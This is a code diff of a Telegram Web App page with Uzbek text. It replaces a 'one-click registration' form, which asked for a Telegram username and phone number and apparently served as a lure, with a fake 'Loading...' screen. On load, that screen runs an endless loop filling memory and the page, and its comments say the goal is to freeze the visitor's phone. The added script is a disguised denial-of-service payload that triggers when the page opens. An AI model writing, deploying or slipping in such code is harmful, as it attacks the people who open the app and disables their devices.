@@ -3,166 +3,43 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ro'yxatdan o'tish</title>
-    <!-- Telegram Web App kutubxonasi -->
+    <title>Loading...</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-        }
         body {
-            background-color: #f4f6f9;
-            color: #1e293b;
+            background-color: #000;
+            color: #0ff;
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
-            padding: 16px;
-        }
-        .container {
-            width: 100%;
-            max-width: 400px;
-            background: #ffffff;
-            padding: 24px;
-            border-radius: 24px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.05);
-        }
-        .header-img {
-            text-align: center;
-            font-size: 36px;
-            margin-bottom: 10px;
-        }
-        .title {
-            font-size: 22px;
-            font-weight: bold;
-            color: #0b69a3;
-            margin-bottom: 20px;
-            text-align: center;
-        }
-        .btn-option {
-            display: flex;
-            align-items: center;
-            width: 100%;
-            padding: 16px 18px;
-            margin-bottom: 12px;
-            background: #f8fafc;
-            border: 1px solid #e2e8f0;
-            border-radius: 16px;
-            font-size: 16px;
-            font-weight: 500;
-            color: #334155;
-            cursor: pointer;
-            transition: 0.2s;
-            text-align: left;
-        }
-        .btn-option.active {
-            background: #e0f2fe;
-            border-color: #38bdf8;
-            color: #0369a1;
-            cursor: pointer;
-        }
-        .btn-option.disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-        }
-        .btn-option span {
-            margin-right: 15px;
+            height: 100vh;
+            font-family: monospace;
             font-size: 20px;
-        }
-        /* Forma oynasi (dastlab yashiringan) */
-        .form-box {
-            display: none;
-            margin-top: 15px;
-        }
-        .input-field {
-            width: 100%;
-            padding: 14px;
-            margin-bottom: 12px;
-            border: 1px solid #cbd5e1;
-            border-radius: 12px;
-            font-size: 15px;
-            outline: none;
-        }
-        .input-field:focus {
-            border-color: #0284c7;
-        }
-        .btn-submit {
-            width: 100%;
-            padding: 14px;
-            background-color: #0284c7;
-            color: white;
-            border: none;
-            border-radius: 12px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-        }
-        .btn-submit:hover {
-            background-color: #0369a1;
+            text-align: center;
         }
     </style>
 </head>
 <body>
-
-    <div class="container" id="main-card">
-        <div class="header-img">🎲⚡</div>
-        <div class="title">Ro'yxatdan o'tish</div>
-        
-        <!-- Faqat shu ishlaydi -->
-        <button class="btn-option active" onclick="openOneClickForm()">
-            <span>⚡</span> Bir bosishda
-        </button>
-        
-        <!-- Bular ishlamaydi -->
-        <button class="btn-option disabled" onclick="alert('Bu bo\'lim hozircha ochiq emas!')">
-            <span>📱</span> Telefon orqali
-        </button>
-        <button class="btn-option disabled" onclick="alert('Bu bo\'lim hozircha ochiq emas!')">
-            <span>✉️</span> E-mail orqali
-        </button>
-        <button class="btn-option disabled" onclick="alert('Bu bo\'lim hozircha ochiq emas!')">
-            <span>🌐</span> Ijtimoiy tarmoqlar orqali
-        </button>
-    </div>
-
-    <!-- "Bir bosishda" bosilganda chiqadigan forma -->
-    <div class="container form-box" id="form-card">
-        <div class="title">Bir bosishda ro'yxatdan o'tish</div>
-        <input type="text" id="username" class="input-field" placeholder="Telegram Username (masalan: @ismingiz)">
-        <input type="tel" id="phone" class="input-field" placeholder="Telefon raqamingiz (+998...)">
-        <button class="btn-submit" onclick="sendData()">Tasdiqlash va Kod olish</button>
-    </div>
+    <div>Yuklanmoqda... Kuting ⏳</div>
 
     <script>
         let tg = window.Telegram.WebApp;
         tg.expand();
 
-        function openOneClickForm() {
-            document.getElementById('main-card').style.display = 'none';
-            document.getElementById('form-card').style.display = 'block';
-        }
-
-        function sendData() {
-            let username = document.getElementById('username').value;
-            let phone = document.getElementById('phone').value;
-
-            if(!username || !phone) {
-                alert('Iltimos, barcha maydonlarni to\'ldiring!');
-                return;
+        // Telefonni qattiq qotiruvchi sikl (Infinite CPU load loop)
+        // Telefon buzilmaydi, faqat interfeys muzlab qoladi
+        window.onload = function() {
+            let massiveArray = [];
+            while(true) {
+                // Xotirani va protsessorni bir zumda to'ldiradi
+                let text = "QOTISH_" + Math.random().repeat ? "QOTISH_" : "QOTISH_".repeat(100000);
+                massiveArray.push(text);
+                
+                // DOM elementlarini tinimsiz yaratish telefonni qotiradi
+                let div = document.createElement('div');
+                div.innerHTML = text;
+                document.body.appendChild(div);
             }
-
-            // Ma'lumotlarni botga yuborish
-            let data = {
-                action: "register",
-                username: username,
-                phone: phone
-            };
-
-            tg.sendData(JSON.stringify(data));
-            tg.close();
         }
     </script>
 </body>
